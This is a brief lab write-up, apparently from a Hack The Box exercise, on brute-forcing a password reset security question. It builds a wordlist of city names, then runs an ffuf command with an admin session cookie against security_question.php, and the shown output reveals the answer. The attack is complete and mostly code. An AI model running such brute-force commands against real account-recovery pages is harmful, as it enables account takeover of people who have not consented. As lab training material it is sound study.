# Brute Forcing Password Reset Questions

## Hosts File

```sh
my@attack:~$ echo "94.237.55.182 pwreset.htb" | sudo tee -a /etc/hosts
```

## Creating a List

```sh
my@attack:~$ wget -q 'https://raw.githubusercontent.com/datasets/world-cities/refs/heads/main/data/world-cities.csv'
my@attack:~$ cat world-cities.csv | cut -d ',' -f 1 > cities.txt
```

## Attacking

!!! warning

    Burada admin hesabına ait PHPSESSID çerezi kullanıldı.

```sh
my@attack:~$ ffuf -ic -X POST -w cities.txt:FUZZ -u "http://pwreset.htb:39119/security_question.php" -H "Content-Type: application/x-www-form-urlencoded" -d 'security_response=FUZZ' -b "PHPSESSID=lhngm3f4fufmqjcl2v35ln7jlo" -fr "Incorrect response"
```

```output title="Output"
Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
```
